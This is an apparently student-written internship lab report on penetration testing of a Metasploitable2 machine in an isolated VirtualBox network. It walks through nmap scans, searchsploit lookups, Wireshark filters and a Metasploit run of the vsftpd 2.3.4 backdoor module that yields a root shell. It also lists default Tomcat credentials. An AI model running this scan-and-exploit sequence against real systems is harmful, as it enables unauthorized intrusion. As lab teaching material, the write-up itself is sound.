# Network Penetration Testing Lab

**CloudExify Cybersecurity Internship 2026 — Month 1, Project 1**

---

## 👤 Author

**Muhammad Shoaib Ahmed**
FA24-BCS-044 | Section BCS-4A
BS Computer Science, COMSATS University Islamabad — Wah Campus

---

## ⚠️ Ethical Disclosure

This project was conducted entirely within an isolated virtual lab environment (VirtualBox Internal Network), using intentionally vulnerable, legally distributed practice machines (Metasploitable2). No real systems, external networks, or third parties were accessed. All testing was authorized, self-contained, and performed strictly for educational purposes as part of the CloudExify Cybersecurity Internship.

---

## 📋 Table of Contents

- [Introduction](#introduction)
- [Objectives](#objectives)
- [Lab Environment](#lab-environment)
- [Setup](#setup)
- [Reconnaissance](#1-reconnaissance)
- [Service Enumeration](#2-service-enumeration)
- [Vulnerability Identification](#3-vulnerability-identification)
- [Packet Analysis (Wireshark)](#4-packet-analysis-wireshark)
- [Exploitation](#5-exploitation-bonus)
- [Challenges & Troubleshooting](#challenges--troubleshooting)
- [Conclusion](#conclusion)
- [Tools Used](#tools-used)
- [Repository Contents](#repository-contents)

---

## Introduction

This project is a hands-on network penetration testing lab built to practice real-world vulnerability discovery in a fully isolated, controlled environment. It follows the standard penetration testing methodology — reconnaissance, scanning, enumeration, vulnerability identification, and reporting — against a deliberately vulnerable target machine, with all traffic captured and analyzed using Wireshark.

![VirtualBox Manager showing all lab VMs](screenshots/00-virtualbox-overview.png)

---

## Objectives

- Build a fully isolated virtual lab environment to safely practice penetration testing
- Apply the standard pentest methodology: reconnaissance → scanning → enumeration → vulnerability identification → reporting
- Identify exact service versions running on the target and cross-reference them against known vulnerabilities
- Capture and analyze live network traffic using Wireshark
- Document findings in a clear, reproducible, professional format

---

## Lab Environment

| Component | Role | Details |
|---|---|---|
| VirtualBox | Virtualization platform | Hosts all VMs |
| Kali Linux | Attacker machine | Runs all scanning/analysis tools |
| Metasploitable2 | Target machine | Deliberately vulnerable Linux VM |
| Network Mode | Internal Network (`pentestlab`) | Fully isolated — no internet or real-network exposure |

**Why isolation matters:** Metasploitable2 contains intentionally unpatched, exploitable vulnerabilities. Running it on an isolated Internal Network ensures none of these are ever reachable from a real network.

---

## Setup

### VM Creation
Two VirtualBox VMs were created: Kali Linux (attacker) and Metasploitable2 (target).

### Network Configuration
Both VMs' Adapter 1 were set to:
- **Attached to:** Internal Network
- **Name:** `pentestlab`

![Kali network settings showing Internal Network pentestlab](screenshots/01-kali-network-settings.png)

![Metasploitable2 network settings showing Internal Network pentestlab](screenshots/02-metasploitable-network-settings.png)

### Static IP Assignment

Since Internal Network mode provides no DHCP, both machines were assigned static IPs manually.

**Kali:**
```bash
sudo ip addr add 192.168.56.10/24 dev eth0
sudo ip link set eth0 up
```

**Metasploitable2:**
```bash
sudo ifconfig eth0 192.168.56.101 netmask 255.255.255.0 up
```

![Kali ip a output showing 192.168.56.10 assigned](screenshots/03-kali-ip-config.png)

![Metasploitable2 ifconfig output showing 192.168.56.101 assigned](screenshots/04-metasploitable-ip-config.png)

### Connectivity Verification
```bash
ping 192.168.56.101
```

![Successful ping between Kali and Metasploitable2](screenshots/05-ping-success.png)

---

## 1. Reconnaissance

**Goal:** confirm the target is alive and reachable before scanning further.

```bash
nmap -sn 192.168.56.101
```

![Nmap host discovery result showing Host is up](screenshots/06-host-discovery.png)

### Basic Port Scan
```bash
nmap -oN nmap_output.txt 192.168.56.101
```

Result: 23 open TCP ports identified, including FTP (21), SSH (22), Telnet (23), SMTP (25), DNS (53), HTTP (80), SMB (139/445), MySQL (3306), PostgreSQL (5432), VNC (5900), IRC (6667), and Apache Tomcat (8180).

![Full basic Nmap scan output](screenshots/07-basic-scan.png)

---

## 2. Service Enumeration

**Goal:** identify the exact software and version behind each open port.

```bash
nmap -sV -sC -p- 192.168.56.101 -oN enumeration.txt
```

![Enumeration scan output showing service versions](screenshots/08a-enumeration-scan.png)
![Enumeration scan output showing service versions](screenshots/08b-enumeration-scan.png)
![Enumeration scan output showing service versions](screenshots/08c-enumeration-scan.png)

### Aggressive Scan (OS + version + scripts + traceroute)
```bash
nmap -A 192.168.56.101
```

![Aggressive scan output](screenshots/09a-aggressive-scan.png)
![Aggressive scan output](screenshots/09b-aggressive-scan.png)
![Aggressive scan output](screenshots/09c-aggressive-scan.png)

### Enumeration Findings

| Port | Service | Version Identified |
|---|---|---|
| 21 | FTP | vsftpd 2.3.4 |
| 22 | SSH | OpenSSH 4.7p1 Debian 8ubuntu1 |
| 23 | Telnet | Linux telnetd |
| 25 | SMTP | Postfix smtpd |
| 80 | HTTP | Apache 2.2.8 (Ubuntu) |
| 139/445 | SMB | Samba smbd 3.X |
| 3306 | MySQL | MySQL 5.0.51a-3ubuntu5 |
| 5432 | PostgreSQL | PostgreSQL 8.3.0 |
| 6667 | IRC | UnrealIRCd |
| 8180 | HTTP (Tomcat) | Apache Tomcat/Coyote JSP engine 1.1 |

### Web Server Enumeration
```bash
curl http://192.168.56.101/
```

![Metasploitable2 web landing page](screenshots/10-web-enumeration.png)

### SMB Share Enumeration
```bash
nmap --script smb-enum-shares -p 139,445 192.168.56.101
```

![SMB share enumeration output](screenshots/11-smb-enum.png)

---

## 3. Vulnerability Identification

**Goal:** cross-reference each identified service version against known CVEs.

### Automated Scan
```bash
nmap --script vuln -p- 192.168.56.101 -oN vulnerability_scan.txt
```

![Vulnerability scan output](screenshots/12a-vuln-scan.png)
![Vulnerability scan output](screenshots/12b-vuln-scan.png)
![Vulnerability scan output](screenshots/12c-vuln-scan.png)
![Vulnerability scan output](screenshots/12d-vuln-scan.png)
![Vulnerability scan output](screenshots/12e-vuln-scan.png)
![Vulnerability scan output](screenshots/12f-vuln-scan.png)
![Vulnerability scan output](screenshots/12g-vuln-scan.png)
![Vulnerability scan output](screenshots/12h-vuln-scan.png)
![Vulnerability scan output](screenshots/12i-vuln-scan.png)
![Vulnerability scan output](screenshots/12j-vuln-scan.png)
![Vulnerability scan output](screenshots/12k-vuln-scan.png)


### Manual Cross-Referencing
```bash
searchsploit vsftpd 2.3.4
searchsploit unrealircd
searchsploit samba 3.0
searchsploit apache 2.2.8
```

![searchsploit results for identified services](screenshots/13a-searchsploit.png)
![searchsploit results for identified services](screenshots/13b-searchsploit.png)

### Vulnerability Summary

| Service | Version | Vulnerability | Reference | Severity |
|---|---|---|---|---|
| vsftpd | 2.3.4 | Backdoor command execution | Metasploit: `exploit/unix/ftp/vsftpd_234_backdoor` | Critical |
| UnrealIRCd | 3.2.8.1 | Backdoor command execution | CVE-2010-2075 | Critical |
| Samba | 3.0.20 | Remote code execution (username map script) | CVE-2007-2447 | Critical |
| Apache Tomcat | (port 8180) | Default credentials (`tomcat`/`tomcat`) | — | High |
| MySQL | 5.0.51a | No root password set | — | High |
| Telnet | — | Unencrypted authentication | — | Medium |

---

## 4. Packet Analysis (Wireshark)

**Goal:** capture and analyze live network traffic to observe scan behavior and identify unencrypted data.

### Capture Setup
1. Started Wireshark on Kali's `eth0` interface (Internal Network)
2. Generated traffic using an active Nmap scan against the target
3. Applied filters to isolate relevant traffic

```bash
sudo wireshark
```

![Wireshark capturing traffic on eth0](screenshots/14a-wireshark-capture.png)
![Wireshark capturing traffic on eth0](screenshots/14b-wireshark-capture.png)
![Wireshark capturing traffic on eth0](screenshots/14c-wireshark-capture.png)
![Wireshark capturing traffic on eth0](screenshots/14d-wireshark-capture.png)

### Filters Applied

```
tcp.port == 21
```
![Wireshark filtered for FTP traffic on port 21](screenshots/15-wireshark-ftp-filter.png)

```
tcp.flags.syn == 1
```
![Wireshark filtered for SYN packets, showing scan pattern](screenshots/16-wireshark-syn-filter.png)

```
ip.src == 192.168.56.101
```
![Wireshark filtered for traffic originating from the target](screenshots/17-wireshark-ip-filter.png)

### Findings
Packet capture confirmed the TCP three-way handshake pattern generated by Nmap's SYN scan, and demonstrated that Telnet and FTP transmit authentication data in plaintext — directly visible in the packet payload with no encryption.

---

## 5. Exploitation (Bonus)

While not required by the project checklist, the vsftpd 2.3.4 backdoor was exploited to confirm the vulnerability was live and practically exploitable, not just theoretically flagged.

```bash
sudo msfconsole
```

![msfconsole startup](screenshots/18-msfconsole-start.png)

```
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run
```

![Exploit execution and successful shell](screenshots/19-exploit-success.png)

```
whoami
id
```

![Confirmed root access on target](screenshots/20-root-confirmed.png)

**Result:** Full root-level shell access obtained with no authentication required, confirming the vsftpd 2.3.4 backdoor vulnerability.

---

## Challenges & Troubleshooting

Documented here since infrastructure troubleshooting is itself part of real-world penetration testing work.

- **No IPv4 on eth0:** VirtualBox's Internal Network mode provides no DHCP server. Resolved by assigning static IPs manually to both VMs.
- **Subnet mismatch:** An address was briefly assigned in the wrong subnet range, causing unreachable errors. Resolved by aligning both machines to the same `192.168.56.0/24` subnet.
- **VM folder relocation:** Moving the VirtualBox VM storage folder caused Metasploitable2 to become "Inaccessible." Resolved by re-registering the VM via VirtualBox's Add/Open function.
- **Stale IP address:** After a network mode change, Kali's `eth0` retained a leftover NAT-assigned address alongside the intended static IP. Resolved using `ip addr flush dev eth0` before reassigning.

![Example troubleshooting screenshot if included](screenshots/21-troubleshooting-example.png)

---

## Conclusion

This lab successfully carried out a complete penetration testing methodology against a deliberately vulnerable target: from network setup and host discovery, through detailed service enumeration and vulnerability cross-referencing, to live packet analysis and confirmed exploitation.

Key takeaways:
- Accurate, methodical enumeration was essential — the specific version detail (vsftpd 2.3.4) is what made targeted exploitation possible, not a generic port scan alone.
- Packet analysis confirmed real-world risk: services like Telnet and FTP transmit credentials in plaintext, directly observable to anyone capturing network traffic.
- Infrastructure and network configuration troubleshooting (subnetting, DHCP, adapter modes) proved to be a significant, realistic part of the overall assessment process.
- A single outdated, unpatched service was sufficient to gain full root access, reinforcing the real-world importance of consistent patch management.

---

## Tools Used

- **VirtualBox** — virtualization platform
- **Kali Linux** — attacker operating system and toolset
- **Metasploitable2** — intentionally vulnerable target machine
- **Nmap** — network scanning, enumeration, and vulnerability scripting
- **Wireshark** — packet capture and traffic analysis
- **searchsploit / Exploit-DB** — vulnerability cross-referencing
- **Metasploit Framework** — exploitation (bonus section)

---

## Repository Contents

```
cloudexify-sec-p1-shoaibahmed/
├── README.md
├── penetration_test_report.pdf
├── nmap_output.txt
├── enumeration.txt
├── vulnerability_scan.txt
├── wireshark_captures.pcap
└── screenshots/
    ├── 00-virtualbox-overview.png
    ├── 01-kali-network-settings.png
    ├── 02-metasploitable-network-settings.png
    ├── 03-kali-ip-config.png
    ├── 04-metasploitable-ip-config.png
    ├── 05-ping-success.png
    ├── 06-host-discovery.png
    ├── 07-basic-scan.png
    ├── a08-enumeration-scan.
    ├── b08-enumeration-scan.
    ├── 08c-enumeration-scan.
    ├── 09a-aggressive-scan.png
    ├── 09b-aggressive-scan.png
    ├── 09c-aggressive-scan.png
    ├── 10-web-enumeration.png
    ├── 11-smb-enum.png
    ├── 12a-vuln-scan.png
    ├── 12b-vuln-scan.png
    ├── 12c-vuln-scan.png
    ├── 12d-vuln-scan.png
    ├── 12e-vuln-scan.png
    ├── 12f-vuln-scan.png
    ├── 12g-vuln-scan.png
    ├── 12h-vuln-scan.png
    ├── 12i-vuln-scan.png
    ├── 12j-vuln-scan.png
    ├── 12k-vuln-scan.png
    ├── 13a-searchsploit.png
    ├── 13b-searchsploit.png
    ├── 14a-wireshark-capture.png
    ├── 14b-wireshark-capture.png
    ├── 14c-wireshark-capture.png
    ├── 14d-wireshark-capture.png
    ├── 15-wireshark-ftp-filter.png
    ├── 16-wireshark-syn-filter.png
    ├── 17-wireshark-ip-filter.png
    ├── 18-msfconsole-start.png
    ├── 19-exploit-success.png
    ├── 20-root-confirmed.png

---

*Project completed as part of the CloudExify Cybersecurity Internship Program 2026 — Month 1, Project 1.*
